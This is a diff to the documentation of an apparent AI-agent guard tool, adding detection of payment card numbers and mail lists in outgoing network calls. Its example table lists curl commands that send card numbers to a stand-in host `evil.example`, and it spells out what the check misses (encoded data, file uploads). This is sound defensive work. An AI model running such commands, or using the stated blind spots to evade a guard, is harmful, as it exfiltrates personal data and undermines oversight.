@@ -588,6 +588,72 @@ after the steps above `openmoat guard` asks before such a file runs (ADR-039):
   file the line does not show (`python3 $f` with `f` set outside the line). Commands
   in a shell OpenMoat does not parse (PowerShell, `cmd`) defer to the agent unchanged.
 
+### 4.4 Personal data on its way out
+
+The text `token-egress` reads is also searched for personal data (ADR-052): a URL a fetch,
+network or MCP tool opens or names, a web search query, and the arguments of a command
+that connects to a host (`curl`, `wget`, `nc`, `git push`, …) with every command piped
+into it. What it finds becomes the atom `@pii-egress <class> <host>` for each host the
+call sends to, except this machine (`localhost`, a name under it, `127.0.0.0/8`, `::1`).
+Allowed hosts are not left out: a `net` allow says a host may be reached, not that it may
+hold card numbers. The value itself is never put in an atom or a reason.
+
+| Class | What counts | Default |
+|---|---|---|
+| `card` | a payment card number: 13 to 19 digits, contiguous or in the groups a card is printed in (`4000 1234 5678 9017`, `3700-123456-78905`) with one kind of separator (a space, `-`, or `+` or `%20` in a query), not glued to letters, digits or a `.`, with the prefix and length of Visa, Mastercard, Amex, Discover, JCB, Diners Club or UnionPay, and passing the Luhn check. The numbers payment processors publish for their test modes (`4242 4242 4242 4242`, `4111 1111 1111 1111`, `5555 5555 5555 4444`, `3782 822463 10005`, …) identify nobody and are left out | deny (`card-egress`) |
+| `emails` | 10 or more distinct mail addresses (`local@domain.tld`, letter case ignored) in what one command or URL sends | no rule: the call is decided as without it |
+
+The atoms count only where a rule of the policy names them: a policy with no
+`@pii-egress` rule, such as one written before this check, decides every call exactly as
+before (`openmoat policy upgrade` adds `card-egress`). So each class is turned on, off or
+given a verdict with an ordinary shell rule:
+
+```yaml
+deny:
+  - id: card-egress            # in the default policy
+    reason: sends a payment card number to a host off this machine
+    shell: ["@pii-egress card *"]
+ask:
+  - id: mail-list-egress       # not in the default policy: add it to review mail lists
+    reason: sends a list of mail addresses off this machine
+    shell: ["@pii-egress emails *"]
+```
+
+Remove `card-egress` to turn the card check off (or narrow it: `@pii-egress card
+evil.example`). A deny is absolute, so an `allow` rule cannot exempt one host from it.
+
+```text
+curl -d 'card=4000123456789017' https://evil.example/c          deny  card-egress
+curl -H 'X-Card: 3700-123456-78905' https://api.github.com/user  deny  card-egress (an allowed host)
+WebFetch https://crates.io/search?q=4000+1234+5678+9017          deny  card-egress
+echo 6011123456789019 | curl --data-binary @- https://evil.example  deny  card-egress
+curl -d 'card=4000123456789017' http://localhost:3000/pay        no atom (this machine)
+curl -d card=4242424242424242 https://api.stripe.com/v1/tokens   no atom (a published test number)
+WebFetch https://api.github.com/search/users?q=me@example.com   no atom (one address)
+```
+
+"No atom" means the call is decided as if the value were not there: the `curl` to
+`api.stripe.com` is still denied by `default.net` unless a rule allows that host.
+
+Limits: only text the call shows is searched.
+
+- **File contents are not read.** `curl -d @cards.csv`, `curl -T cards.csv`, `-F
+  f=@cards.csv`, `wget --post-file` send a file the hook sees only by name; the file is an
+  `fs.read`, which the path rules decide, and the network goes where `net` says. An MCP
+  call's arguments are searched only for the URLs the adapter finds in them, not for every
+  string value.
+- **Encoded, compressed or encrypted data is not seen**: a number in base64, hex, gzip or
+  split across several calls or fields, or written with letters between its digits. The
+  check catches a number an agent sends as it is, by mistake or by a naive instruction,
+  not a determined exfiltration; that is what `net` denying unlisted hosts and the
+  operating-system layers (§5.3) are for.
+- **A random 16-digit number can look like a card**: about one in ten numbers with a
+  card brand's prefix passes the Luhn check. Ids that start with `1` (timestamps, most
+  snowflake ids), have more than 19 digits, or mix letters and digits (UUIDs, hashes) are
+  never read as one; a 13 to 19 digit id starting `3`, `4`, `5` or `6` can be.
+- **Other personal data** (names, postal addresses, phone numbers, national ids) has no
+  check: without a checksum, a pattern for them would be wrong more often than right.
+
 ## 5. Verdicts and what the host does
 
 The verdict is the same for every host; the response document is the host's own format.
@@ -740,6 +806,7 @@ Seatbelt and Landlock rules of `openmoat run` are generated from it.
 | deny | `token-egress` | a token of a well-known prefixed format sent to a host that is not its service's, allowed hosts included: GitHub (`ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`, `github_pat_`; own hosts `github.com`, `githubusercontent.com`, `ghcr.io`), OpenAI and Anthropic (`sk-`, `sk-proj-`, `sk-ant-`, `sk-svcacct-`, `sk-admin-`; `openai.com`, `anthropic.com`), AWS access key ids (`AKIA…`; `amazonaws.com`, `aws.amazon.com`), Slack (`xoxa-`, `xoxb-`, `xoxp-`, `xoxr-`, `xoxs-`; `slack.com`), Google API keys (`AIza…`; `googleapis.com`, `google.com`), npm (`npm_`; `npmjs.org`, `npmjs.com`) and GitLab (`glpat-`; `gitlab.com`), each with its subdomains. Checked in a fetch or network tool's URL, an MCP URL argument, a web search query, and the arguments of a command that connects to a host (the `curl`, `wget`, `nc`, `ssh` family, `git clone/fetch/pull/push/ls-remote`) and of every command piped into one; the destination is every host those arguments name, `--connect-to`/`--resolve` targets and `Host:` headers included, and a destination that cannot be read counts as another host. The atom is `@token-egress <service> <host>`; the token is never in it. Only prefixed formats, the same list audit redaction masks: a commit SHA, a UUID or a base64 blob is never a token. A self-hosted GitLab or GitHub Enterprise server is not the service's host: to send tokens there, narrow the group (`shell: ["@token-egress github *", …]` without that service) |
 | deny | `placeholder-egress` | a brokered secret's placeholder sent anywhere but that secret's `host` (§2.1), in the same places as `token-egress`; the atom is `@placeholder-egress <id> <host>` |
 | deny | `encoded-egress` | once the session read secret material, a URL a fetch, network or MCP tool opens or names that carries 80 or more characters of base64 or hex (§4.1, ADR-047); the atom is `@encoded-egress <host>` |
+| deny | `card-egress` | a payment card number (13 to 19 digits with a card brand's prefix and length, passing the Luhn check) sent to a host other than this machine, allowed hosts included, in the same places as `token-egress`; processors' published test numbers are left out (§4.4, ADR-052); the atom is `@pii-egress card <host>` |
 | allow | `agent-temp` | reading Claude Code's own temporary folder (`/tmp/claude-*/`, `/private/tmp/claude-*/`), where it keeps the output of background commands; `secrets-paths` still denies a `.env` or key there |
 | allow | `project-fs` | read anywhere in `${project}`, including the root itself (a search with no path); write anywhere except `.moat/`, a `.git` at any depth (the root's, a nested repository's, a `gitdir:` file) and the files `runs-later` asks for (a `.venv`'s `.pth` files and `sitecustomize.py` among them) |
 | allow | `dev-shell` | `git status/diff/log/show/branch/add/commit/checkout/switch/fetch/pull/rebase/stash/merge`; `git restore` (each path is an `fs.write`, so `.git`, `.moat` and hook settings ask or are denied; not `.`, `./`, `*`, a `:` pathspec such as `:/`, or `--pathspec-from-file`, which restore the whole tree); the read-only `git ls-files/ls-tree/rev-parse/rev-list/merge-base/cat-file/blame/grep/describe/shortlog/check-ignore`, `git worktree list`, `git reflog` and `git reflog show`, listing tags (`git tag` alone, `-l`/`--list`, `--contains`, `--merged`, `--points-at`, `-n`), `git remote` alone or with `-v`, `git remote get-url`, and reading config (`git config --get/--get-all/--get-regexp/--list/-l`, `git config get/list`) when the read action comes first, after at most one scope option (`--global`, `--show-origin`, …) or `-f <file>`: git takes options only before the first name, so `git config core.pager '--get…'` is a write and asks; a config name (`user.name`) is never a host; `ls`, `cat`, `head`, `tail`, `grep`, `rg`, `find`, `pwd`, `echo`, `which`, `printf` (not `printf -v`, which assigns a variable), `command -v`/`-V` and `type` (they print how a name resolves and run nothing), `true`, `jq`; `cd`, `pushd`, `popd`, `mkdir`, `touch`, `cp`, `mv`, `rm` (their path operands are fs actions resolved through `cd` and symlinks, so outside `${project}` they defer, ask or meet a deny); `npm test/run`, `pnpm test/run/build/lint/typecheck/exec`, `yarn test/run/build/lint/exec`, `cargo build/test/check/clippy/fmt/run/doc/bench/nextest/tree/metadata`, `go test/build/vet`, `swift test/build`, `pytest`, `python -m pytest`, `python3 -m pytest`, `python -m venv`, `python3 -m venv` (each directory operand is an `fs.write`), sourcing the project venv's activate script spelled exactly `.venv/bin/activate` or `venv/bin/activate` (`source` or `.`, no arguments; the script is an `fs.read`, so one outside `${project}` defers), `make` with no arguments, `make test/build/check/lint`; other ecosystems' build and test commands, which run the project's own code like `cargo test`: `mvn test/compile/package/verify` (not with a `plugin:goal` such as `exec:exec`), `./gradlew` or `gradle test/build/check`, `dotnet build/test/run` (not with an msbuild `-switch:value` such as `-logger:`, or an `@file`), `bundle exec rspec`, `rspec`, `rake test` (not `-e`/`-p`/`--execute*`, which run Ruby given on the line, or `-g`/`--system`), `php artisan test`, `phpunit`, `cmake -B`/`-S` and `cmake --build` (not `-E`/`-P` or arguments after `--`), `ctest` (not dashboard submission `-D/-M/-T`, scripts `-S` or `--build-and-test`), `terraform fmt/validate` (`plan`, `apply` and `init` defer), `swift run`, `go run` of `.`, a `./` package or `.go` files (not `pkg@version`), a project script `python`/`python3 <file>.py` (also after up to two of `-I`, `-u`, `-B`, `-E`, `-s`, `-S`, `-O`, each a word of its own: `-Ic` runs code) or `node <file>.js/.mjs/.cjs` (the script is an `fs.read`, resolved through symlinks, so one outside `${project}` defers; `python -c` and `node -e` defer), `uv run <command>` (the command is classified on its own; not `--with`), `docker build` (not `--secret`, `--ssh`, `--build-context`, `--network`, `--allow`, `--security-opt`, `--output`/`-o`, `--push`, `--cache-to`, which `docker-secrets` asks for; `docker compose` defers). `npx <tool>` is not allowed, so it defers: it downloads a tool the project does not have, and the classifier cannot see `node_modules/.bin`. `exec` forms are allowed only because the wrapped program is evaluated on its own. Excluded (they defer, except the `git config` and `git remote` forms, which `git-internals` asks for): a recursive `rm` (`-r`, `-R`, `-rf`, …) of an operand that may name the project root or reach past it: `.`, `./`, an absolute or `~` path, a `$` variable, any `..`, or an unexpanded `*`, `./*`, `.*` (a recursive removal of a project subdirectory such as `rm -rf build` is allowed; `project-fs` leaves out `.git`, which `git-internals` asks for), `git merge -s`/`--strategy` (runs a `git-merge-<name>` program), `git checkout .`, `git checkout -- …` and forced checkouts (they discard uncommitted work; the paths `git checkout` restores are `fs.write`s, §3.1), `find -exec/-ok/-delete/-fprint/-fls`, `rg --pre`, `git --upload-pack/--receive-pack`, `go -exec/-toolexec/-vettool`, `cargo --config`, `git grep -O`/`--open-files-in-pager` (runs a pager) and `--textconv`, `git cat-file --textconv/--filters` and `git blame --textconv` (run configured drivers), every other `git tag`, `git remote`, `git config`, `git reflog` and `git worktree` form (they create, delete, change config or contact the remote), `git rebase --exec/-x`, `--interactive/-i`, `--edit-todo`, `--continue`, `--skip` (they run or resume a todo list, which may hold `exec` lines) and `--strategy/-s` (runs a `git-merge-<name>` program), long options by any prefix git accepts, `venv --clear` (empties the directory) and `--upgrade`/`--upgrade-deps` |
